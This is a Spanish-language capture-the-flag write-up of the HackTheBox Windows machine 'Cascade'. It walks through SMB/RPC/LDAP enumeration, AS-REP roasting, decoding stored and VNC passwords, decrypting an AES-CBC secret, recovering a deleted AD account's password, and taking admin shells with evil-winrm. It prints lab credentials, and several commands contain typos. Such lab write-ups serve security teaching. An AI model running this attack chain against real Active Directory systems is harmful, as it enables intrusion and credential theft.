---
layout: post
title: HTB_Cascade
date: 2023/07/10
slug: HTB_Cascade
heroImage: /assets/machines.jpg
---

# Cascade {-}

## Introduccion {-}

La maquina del dia se llama Cascade.

El replay del live se puede ver aqui

[![S4vitaar Cascade maquina](https://img.youtube.com/vi/whzdQw-zW_k/0.jpg)](https://www.youtube.com/watch?v=whzdQw-zW_k)

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.182
```
ttl: 127 -> maquina Windows

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.182
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.182 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p53,88,135,139,389,445,636,3268,5985,49154,49155,49157,49158,49170 10.10.10.182 -oN targeted
```


| Puerto | Servicio   | Que se nos occure?                       | Que falta?                |
| ------ | ---------- | ---------------------------------------- | ------------------------- |
| 53     | domain     | Domain controller rpcclient null session |                           |
| 88     | Kerberos   | asproasting attack                       | lista de usuarios validos |
| 135    | msrpc      |                                          |                           |
| 139    | netbios    |                                          |                           |
| 389    | LDAP       | Bloodhound                               | credenciales              |
| 445    | smb        | Null session                             |                           |
| 636    | tcpwrapped |                                          |                           |
| 3268   | ldap       |                                          |                           |
| 3269   | tcpwrapped |                                          |                           |
| 5985   | WinRM      | evil-winrm                               | credenciales              |
| 49154  | msrpc      | Puertos por defecto de windows           |                           |
| 49155  | msrpc      | Puertos por defecto de windows           |                           |
| 49157  | ncacn_http | Puertos por defecto de windows           |                           |
| 49158  | msrpc      | Puertos por defecto de windows           |                           |
| 49170  | msrpc      | Puertos por defecto de windows           |                           |


### Analyzando el SMB {-}

```bash
crackmapexec smb 10.10.10.182
smbclient -L 10.10.10.182 -N
smbmap -H 10.10.10.182 -u 'null'
```

Vemos que estamos frente de una maquina Windows 6.1 que se llama **CASC-DC1** en el dominio **cascade.local** con un certificado firmado.
Añadimos el dominio al 
```bash
 /etc/hosts 
```
.
Aqui, no podemos ver los recursos compartidos a nivel de red con un null session.

### Buscando ususarios con rpcclient y rpcenum {-}

```bash
rpcclient -U "" 10.10.10.182 -N

rpcclient $> enumdomusers
rpcclient -U "" 10.10.10.182 -N -c "enumdomusers"
rpcclient -U "" 10.10.10.182 -N -c "enumdomusers" | grep -oP '\[.*?\]'
rpcclient -U "" 10.10.10.182 -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep -v "0x"
rpcclient -U "" 10.10.10.182 -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep -v "0x" | tr -d '[]'
rpcclient -U "" 10.10.10.182 -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep -v "0x" | tr -d '[]' > users
```

Tambien podemos aprovechar de la utilidad de S4vitar 

```bash
git clone https://github.com/s4vitar/rpcenum
cd rpcenum
./rpcenum -e All -i 10.10.10.182
```

Como tenemos un listado de usuarios, podemos explotar un Asproasting ataque.

### Asproasting Attack {-}

```bash
GetNPUsers.py cascade.local/ -no-pass -userfile users
```

Aqui no podemos ver nada.

### Kerbrute {-}

```bash
git clone https://github.com/ropnop/kerbrute
cd kerbrute
go build -ldflags "-s -w" .
upx kerbrute
./kerbrute userenum --dc 10.10.10.182 -d cascade.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

Tampoco vemos nada aqui.
## Vulnerability Assessment {-}

### ldapsearch {-}

Como el ldap esta disponibles, usamos **ldapsearch** para enumerar el LDAP.

```bash
ldapsearch -x -h 10.10.10.182 -b "dc=cascade,dc=local"
```

Como la enumeracion es muy grande, buscamos emails

```bash
ldapsearch -x -h 10.10.10.182 -b "dc=cascade,dc=local" | grep "@cascade.local"
```

Miramos por cada uno de estos usuarios encontrados si hay informaciones relevantes por cada uno de ellos mirando las 20 lineas que hay debajo
del grep

```bash
ldapsearch -x -h 10.10.10.182 -b "dc=cascade,dc=local" | grep "@cascade.local -A 20
```

Debajo del usuario **r.thompson** vemos un cascadeLegacyPwd en base64

```bash
echo "clk0bjVldmE=" | base64 -d; echo
```

Tiene pinta de ser una contraseña.

Validamos el usuario con crackmapexec

```bash
crackmapexec smb 10.10.10.182 -u "r.thompson" -p "rY4n5eva"
```

Vemos que este usuario es valido pero no nos da un **Pwn3d!**. Miramos si podemos connectar por WinRM

```bash
crackmapexec winrm 10.10.10.182 -u "r.thompson" -p "rY4n5eva"
```

pero no.

Miramos Si tenemos accesso a directorio compartidos a nivel de red

```bash
smbmap -H 10.10.10.182 -u 'r.thompson' -p 'rY4n5eva'
```

podemos ver recursos como:

- Data
- NETLOGON
- print$
- SYSVOL

Creamos una montura contra el directorio 
```bash
 Data 
```


```bash
mkdir /mnt/smbmounted
mount -t cifs //10.10.10.182/Data /mnt/smbmounted -o username=r.thompson,password=rY4n5eva,domain=cascade.local,rw
cd /mnt/smbmounted
tree
```

Vemos un fichero 
```bash
 Meeting_Notes_June_2018.html 
```
 y lo analyzamos desde un servidor web

```bash
cd /var/www/html
cp /mnt/smbmounted/IT/Email\ Archives/Meeting_Notes_June_2018.html index.html
service apache2 start
```

Y lo miramos desde firefox en localhost. Y vemos un email escrito por Steve (s.smith) que nos dice que hay una cuenta temporar 
llamada TempAdmin que a sido creada para manejar migraciones y que esta cuenta tiene la misma contraseña que el usuario admin.

Mirando los otros ficheros, vemos un 
```bash
 VNC Install.reg 
```
.

```bash
file VNC\ Install.reg
cat VNC\ Install.reg
```

Aqui podemos ver una contraseña en hexadecimal

```bash
echo "6b,cf,2a,4b,6e,5a,ca,0f" | tr -d ','
echo "6b,cf,2a,4b,6e,5a,ca,0f" | tr -d ',' | xxd -ps -r
echo "6b,cf,2a,4b,6e,5a,ca,0f" | tr -d ',' | xxd -ps -r > pass
cat password
```

Vemos que el contenido esta encryptado. Buscamos por internet si existe un decrypter para contraseñas de VNC

```bash
git clone https://github.com/jeroennijhof/vncpwd
cd vncpwd
make
make install
upx
./vncpwd password
```

Aqui vemos la contraseña. Lo validamos con crackmapexec

```bash
crackmapexec smb 10.10.10.182 -u "s.smith" -p "sT333ve2"
crackmapexec winrm 10.10.10.182 -u "s.smith" -p "sT333ve2"
```

El usuario es validado y ademas tiene un **Pwn3d!** en el winrm.
## Vuln exploit & Gaining Access {-}

### Coneccion con EVIL-WINRM {-}


```bash
evil-winrm -i 10.10.10.182 -u 's.smith' -p 'sT33ve2'
whoami
ipconfig
type ../Desktop/user.txt
```

Ya podemos leer la flag.
## Privilege Escalation {-}

### Rootear la maquina {-}

```powershell
cd C:\Users\Administrator
dir
whoami /priv
whoami /all
net user
net localgroup "Audit Share"
```

Aqui vemos quel usuario es parte de un grupo 
```bash
 Audit Share 
```
 y que le da el privilegio de ver un recurso compartido a nivel de red llamado 
```bash
 \\Casc-DC1\Audit$ 
```
.

```bash
smbmap -H 10.10.10.182 's.smith' -p 'sT33ve2'
mkdir Audit
cd Audit
smbclient //10.10.10.182/Autdit$ -U "s.smith%sT33ve2"
dir
prompt off
recurse ON
mget *
```

Aqui hemos descargado todo los ficheros del recurso compartido. Hay un fichero 
```bash
 Audit.db 
```
, lo analyzamos con sqlite

```bash
cd DB
sqlite3 Audit.db

.tables
select * from DeletedUserAudit;
select * from Ldap;
```

Vemos una contraseña encryptada en base64 del usuario 
```bash
 ArkSvc 
```
.

```bash
echo "8QO5l5Kj9MdErXx6Q6AG0w==" | base64 -d; echo
echo "8QO5l5Kj9MdErXx6Q6AG0w==" | base64 -d > arksvc_password
cat arksvc_password
```

Nuevamente vemos que es una contraseña encryptada. Tenemos que buscar con que a sido encryptada.

Como hay differentes ficheros windows, transferimos los ficheros a una maquina windows.

En la maquina windows, instalamos el 
```bash
 dotPeek 
```
 que es una heramienta que nos permite analyzar codigo dotNet a bajo nivel.
Vemos aqui una Key y utiliza la dll CascCrypto para encryptar y desencryptar cosas. Analyzamos la dll y vemos que utiliza un **Modo CBC** para 
encryptar y desencryptar. Vemos un **IV** y con [cyberChef](https://gchq.github.io/CyberChef/) desencryptamos la contraseña.


![Cascade-cbc-decryt](/assets/images/Cascade-cbc-decrypt.png) 
Ya tenemos contraseña y validamos con crackmapexec.

```bash
crackmapexec smb 10.10.10.182 -u 'arksvc' -p 'w3lc0meFr31nd'
crackmapexec winrm 10.10.10.182 -u 'arksvc' -p 'w3lc0meFr31nd'
```

Como el usuario esta **Pwn3d!** con winrm nos connectamos con **Evil-WinRM**.

```bash
evil-winrm -i 10.10.10.182 -u 'arksvc' -p 'w3lc0meFr31nd'
```

Enumeramos

```powershell
cd C:\Users\Administrator
dir
whoami /priv
```

Aqui vemos que el usuario es parte del grupo **AD Recycle Bin** y esto nos hace pensar que los ficheros que hemos visto
contiene un log en el cual habia el usuario **AdminTemp** en el **Recycle Bin**. Esto podria permitirnos buscar Objetos
borrados. Buscando por internet encontramos un comando:

```powershell
Get-ADDObject -Filter 'Deleted -eq $true' -IncludeDeletedObjects
```

Encontramos el usuario borrado pero necesitamos ver si podemos encontrar propriedades de este objeto

```powershell
Get-ADDObject -Filter 'Deleted -eq $true' -IncludeDeletedObjects -Properties *
```

Aqui encontramos su **CascadeLegacyPwd** en base64

```bash
echo "YmFDVDNyMWFOMDBkbGVz" | base64 -d; echo
```

Parece ser una contraseña. Como en el email que hemos encontrado, se supone que la contraseña es la misma que la contraseña del usuario **Administrator**.
Lo comprobamos

```bash
crackmapexec smb 10.10.10.182 -u 'Administrator' -p 'baCT3r1aN00dles'
```

y si vemos el **Pwn3d!**. Esto quiere decir que nos podemos conectar con **Evil WinRM**.

```bash
evil-winrm -i 10.10.10.182 -u 'Administrator' -p 'baCT3r1aN00dles'

whoami
#Output 
cascade\administrator
```

Ya podemos leer la flag.

